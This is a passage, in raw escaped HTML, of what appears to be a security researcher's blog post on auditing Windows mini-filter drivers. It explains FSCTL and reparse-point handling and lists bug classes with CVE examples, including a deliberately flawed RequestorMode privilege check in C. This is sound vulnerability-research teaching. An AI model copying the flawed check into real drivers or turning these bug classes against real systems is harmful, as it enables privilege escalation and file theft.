&amp;nbsp; ps&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Buffered&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;OutputBufferLength&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;for&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;ULONG i &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c9"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;length&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;++&lt;/span&gt;&lt;span class="c4"&gt;i&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c4 c54"&gt;char&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;tmp &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;buffer&lt;/span&gt;&lt;span class="c9"&gt;[&lt;/span&gt;&lt;span class="c4"&gt;i&lt;/span&gt;&lt;span class="c9"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; buffer&lt;/span&gt;&lt;span class="c9"&gt;[&lt;/span&gt;&lt;span class="c4"&gt;i&lt;/span&gt;&lt;span class="c9"&gt;]&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;buffer&lt;/span&gt;&lt;span class="c9"&gt;[&lt;/span&gt;&lt;span class="c4"&gt;length &lt;/span&gt;&lt;span class="c9"&gt;-&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c9"&gt;-&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;1&lt;/span&gt;&lt;span class="c9"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; buffer&lt;/span&gt;&lt;span class="c9"&gt;[&lt;/span&gt;&lt;span class="c4"&gt;length &lt;/span&gt;&lt;span class="c9"&gt;-&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c9"&gt;-&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;1&lt;/span&gt;&lt;span class="c9"&gt;]&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;tmp&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;IoStatus&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Status &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;STATUS_SUCCESS&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;IoStatus&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Information &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;length&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_COMPLETE&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The parameters for the FSCTL or IOCTL are separated based on the method of buffer access. In this case the FSCTL uses &lt;/span&gt;&lt;span class="c21"&gt;METHOD_BUFFERED&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;so the parameters are accessed through the Buffered field. The filter driver needs to ensure it handles correctly all buffer types if it wants to implement its own control codes.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;This technique is used by the Windows Overlay Filter (WOF). For example, the FSCTL code &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/fsctl-set-external-backing"&gt;FSCTL_SET_EXTERNAL_BACKING&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;is not supported by NTFS. Instead it&amp;rsquo;s intercepted by a pre-operation callback in the WOF filter which completes it before it reaches the NTFS driver. The NTFS driver never sees the control code, unless the WOF driver happens to not be enabled.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.bezu0geuqkhr"&gt;&lt;span class="c5"&gt;Reparse Points&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Reparse point buffers are most commonly known for implementing symbolic link support for NTFS. However the reparse point feature of NTFS can store arbitrary tagged data which is used by filter drivers to store additional offline state information for a file. For example, WOF uses its own reparse buffer, with the tag IO_REPARSE_TAG_WOF to store the location of the real file or status of a compressed file.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;A user-mode application would set, query and delete using FSCTL control codes, such as &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_set_reparse_point"&gt;FSCTL_SET_REPARSE_POINT&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The recommended way a mini-filter driver should set and delete a file&amp;rsquo;s reparse buffer is through the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-flttagfile"&gt;FltTagFile&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(and &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-flttagfileex"&gt;FltTagFileEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) and &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltuntagfile"&gt;FltUntagFile&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;APIs to set and remove the reparse buffer. Searching for the driver&amp;rsquo;s imported APIs should quickly show whether the driver uses its own reparse buffer format.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To open a file with the supported reparse point buffer the driver could register for the post-create callback and wait for any request which returns the &lt;/span&gt;&lt;span class="c21"&gt;STATUS_REPARSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;NT status then query for the reparse point data from the &lt;/span&gt;&lt;span class="c21"&gt;TagData&lt;/span&gt;&lt;span&gt;&amp;nbsp;field in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_CALLBACK_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;parameter. If the reparse tag matches one the filter driver supports it can re-issue the create request but specify the &lt;/span&gt;&lt;span class="c21"&gt;FILE_OPEN_REPARSE_POINT&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;flag to open the file and ignore the reparse point. There are many problems with this, not least it requires two IO requests for a single creation and the driver would have to process every reparse event.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To simplify this Windows 10 supports the &lt;/span&gt;&lt;span class="c21"&gt;ECP_TYPE_OPEN_REPARSE_GUID&lt;/span&gt;&lt;span&gt;&amp;nbsp;ECP. You add the ECP with a buffer containing an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_open_reparse_list_entry"&gt;OPEN_REPARSE_LIST_ENTRY&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which defines the reparse tag the driver handles. When NTFS encounters a reparse point buffer it checks to see if it&amp;rsquo;s in the open reparse list. If so instead of returning STATUS_REPARSE the &lt;/span&gt;&lt;span class="c21"&gt;OPEN_REPARSE_POINT_TAG_ENCOUNTERED&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag is set in the &lt;/span&gt;&lt;span class="c21"&gt;OPEN_REPARSE_LIST_ENTRY&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure, the file is opened and success NT status code is returned. The filter driver can then check for the flag in the post-create callback, if set it can query the reparse tag from the file, for example using &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_get_reparse_point"&gt;FSCTL_GET_REPARSE_POINT&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and handle accordingly.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The filter manager also exposes the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltaddopenreparseentry"&gt;FltAddOpenReparseEntry&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltremoveopenreparseentry"&gt;FltRemoveOpenReparseEntry&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;to simplify adding and removing these open reparse list entries. Searching for use of these APIs should give you an idea if the filter driver implements its own reparse point format.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The reason I mention this in the context of communication is that a filter driver will process these reparse buffers when accessing the file system. The NTFS driver only checks for the &lt;/span&gt;&lt;span class="c21"&gt;SeCreateSymbolicLinkPrivilege &lt;/span&gt;&lt;span&gt;privilege if a user is writing the &lt;/span&gt;&lt;span class="c21"&gt;IO_REPARSE_TAG_SYMLINK&lt;/span&gt;&lt;span&gt;&amp;nbsp;tag. NTFS delegates the verification of the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_reparse_data_buffer"&gt;REPARSE_DATA_BUFFER&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which will be written to the file system by calling the kernel API &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-fsrtlvalidatereparsepointbuffer"&gt;FsRtlValidateReparsePointBuffer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The kernel API only does basic length checks for non-symlink tag types so the arbitrary bytes set in the &lt;/span&gt;&lt;span class="c21"&gt;DataBuffer &lt;/span&gt;&lt;span class="c1"&gt;field can be completely untrusted, which can allow for security issues during parsing.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.nvwzy7a65z5f"&gt;&lt;span&gt;Security Bug Classes&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;I&amp;rsquo;ve now provided examples of how a mini-filter operates and how you can communicate with it. Let&amp;rsquo;s finish up with an overview of potential bug classes to look for when doing a review. Some of these bug classes are common to any kernel driver, but others are very specifically due to the way mini-filters operate. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Where possible I&amp;rsquo;ll also provide an example of a vulnerability I&amp;rsquo;ve discovered to improve understanding. Note, this is not an exhaustive list, I&amp;rsquo;m sure there are some novel bug classes that I don&amp;rsquo;t know about which are missing from this list. Which is why it&amp;rsquo;s good to describe this process in more detail so others can take advantage of my knowledge and find new and interesting issues.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To aid in analysis I&amp;rsquo;ve uploaded my header file I use in IDA Pro to populate the filter manager types. You can get it from &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://gist.github.com/tyranid/49d8a1b9e53bba4eac40df32e15d4a98"&gt;github&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;. I&amp;rsquo;ve tried to ensure it&amp;rsquo;s correct and up to date, but there&amp;rsquo;s a chance that it is not. YMMV.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.trfsw8g0jr2u"&gt;&lt;span class="c5"&gt;Common and garden variety memory safety hazards&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Being native C code you can expect the same sorts of issues you&amp;rsquo;d find in any sizable code base including integer wrapping and incorrect reference counting leading to memory safety hazards. Any of the described communication methods could result in untrusted data being processed and mishandled. I don&amp;rsquo;t think I need to describe this in any detail.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.4m3f2p8i4zvb"&gt;&lt;span class="c5"&gt;Ignoring the RequestorMode Value&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;All filtered IO requests have an assigned &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode &lt;/span&gt;&lt;span&gt;parameter in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_CALLBACK_DATA&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure which indicates whether it originated from user or kernel mode code. If an IO request is dispatched from kernel mode code the IO manager and file system drivers typically disable security checks, such as file access checking.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;There are a couple of related bug classes you&amp;rsquo;ll see with regards to &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode&lt;/span&gt;&lt;span class="c1"&gt;. The first class is the filter driver ignoring its value. This can be a problem if the filter driver redirects the IO request to another file either directly or by using a reparse operation during file creation. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;For example, &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1452"&gt;CVE-2018-0877&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;was an issue I found in the WCIFS driver which provides file system virtualization for Desktop Bridge applications. The root cause was the driver would reparse to a user controllable location if the requested file didn&amp;rsquo;t exist in privileged Windows directories.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;It&amp;rsquo;s common to find kernel code opening files inside privileged directories with &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode &lt;/span&gt;&lt;span&gt;set to the kernel. The kernel code can make the assumption this can&amp;rsquo;t be tampered with as only an administrator can normally modify those directories. The end result was a normal user application could get a file opened in the user controllable location but with access checking disabled. In the &lt;/span&gt;&lt;span&gt;proof-of-concept in the issue tracker&lt;/span&gt;&lt;span&gt;&amp;nbsp;I exploit this to redirect a request for a &lt;/span&gt;&lt;span class="c21"&gt;National Language Support (NLS)&lt;/span&gt;&lt;span&gt;&amp;nbsp;file to ready arbitrary files on disk such as the SAM hive. The technique was described separately in &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html"&gt;this blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.bd8wudoiv5om"&gt;&lt;span class="c5"&gt;Incorrect RequestorMode Check.&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;The second bug class in checking the &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode&lt;/span&gt;&lt;span&gt;&amp;nbsp;can occur during a file create operation. Specifically the &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is checked but the driver does not verify if access checking has been re-enabled through the &lt;/span&gt;&lt;span class="c21"&gt;IO_FORCE_ACCESS_CHECK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag passed to &lt;/span&gt;&lt;span class="c21"&gt;IoCreateFile&lt;/span&gt;&lt;span&gt;&amp;nbsp;and variants. For a bit more context on this bug class refer &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html"&gt;to my blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;from last year where I collaborated with Microsoft on related issues.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2803cc07482359c63e8d6477930901dc31bec199"&gt;&lt;/a&gt;&lt;a id="t.21"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c30 c4"&gt;FLT_PREOP_CALLBACK_STATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;PreCreateOperation&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PCFLT_RELATED_OBJECTS FltObjects&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PVOID&lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;CompletionContext&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;if&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;(!&lt;/span&gt;&lt;span class="c4"&gt;SeSinglePrivilegeCheck&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;SeExports&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;SeTcbPrivilege&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;RequestorMode&lt;/span&gt;&lt;span class="c9"&gt;))&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;IoStatus&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Status &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;STATUS_ACCESS_DENIED&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_COMPLETE&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c4 c40 c80"&gt;// Perform some privileged action.&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_SUCCESS_WITH_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The example above shows misuse of the &lt;/span&gt;&lt;span class="c21"&gt;RequestorMode &lt;/span&gt;&lt;span&gt;field. It passes it directly to &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck"&gt;SeSinglePrivilegeCheck&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, if it indicates the call came from the kernel then the privilege check will always return TRUE meaning the privileged action will be taken. If you read the linked blog post, this can happen if the file is opened through calling &lt;/span&gt;&lt;span class="c21"&gt;IoCreateFileEx&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;or similar APIs with incorrect flags.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To guard against this issue the driver needs to check if the &lt;/span&gt;&lt;span class="c21 c31"&gt;SL_FORCE_ACCESS_CHECK&lt;/span&gt;&lt;span class="c31"&gt;&amp;nbsp;flag has been set in the &lt;/span&gt;&lt;span class="c31 c21"&gt;OperationFlags&lt;/span&gt;&lt;span class="c31"&gt;&amp;nbsp;field of the&lt;/span&gt;&lt;span class="c31 c21"&gt;&amp;nbsp;FLT_IO_PARAMETER_BLOCK&lt;/span&gt;&lt;span class="c31"&gt;&amp;nbsp;structure. If that flag is set the value of &lt;/span&gt;&lt;span class="c31 c21"&gt;RequestorMode&lt;/span&gt;&lt;span class="c31"&gt;&amp;nbsp;should always be assumed to be from user mode.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.ph0s82u73nia"&gt;&lt;span class="c5"&gt;Driver and Kernel IO Operation Mismatch&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The Windows platform is constantly iterating new features, this is even more true since the release of Windows 10 and its six month release cycles. This can introduce new features to the IO stack such as new information classes or IO control codes or additional functionality to existing features.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;For the most part the mini-filter driver can just ignore operations it doesn&amp;rsquo;t care about. However, if it does process an IO operation it needs to match with what&amp;rsquo;s implemented in the rest of the OS, which can be difficult if the OS changes around the driver.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;An example of this issue is the WOF driver&amp;rsquo;s handling of &lt;/span&gt;&lt;span&gt;reparse&lt;/span&gt;&lt;span&gt;&amp;nbsp;points. To prevent applications from setting arbitrary reparse points with the &lt;/span&gt;&lt;span class="c21"&gt;IO_REPARSE_TAG_WOF&lt;/span&gt;&lt;span&gt;&amp;nbsp;tag it handles the &lt;/span&gt;&lt;span class="c21"&gt;FSCTL_SET_REPARSE_POINT&lt;/span&gt;&lt;span&gt;&amp;nbsp;IO control code and rejects any attempt to set a reparse point buffer with that tag. To complete the trick the driver also hides a file&amp;rsquo;s reparse point from being queried or removed if it&amp;rsquo;s set to &lt;/span&gt;&lt;span class="c21"&gt;IO_REPARSE_TAG_WOF&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The issue &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2088"&gt;CVE-2020-17139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;resulted from the OS adding a new &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/fsctl-set-reparse-point-ex"&gt;FSCTL_SET_REPARSE_POINT_EX&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;IO control code which the WOF driver didn&amp;rsquo;t handle. This allowed an application to add or remove the WOF IO tag which resulted in a way of getting an arbitrary file to have a cached code signature to bypass mechanisms such as &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control"&gt;Windows Defender Application Control&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;h3 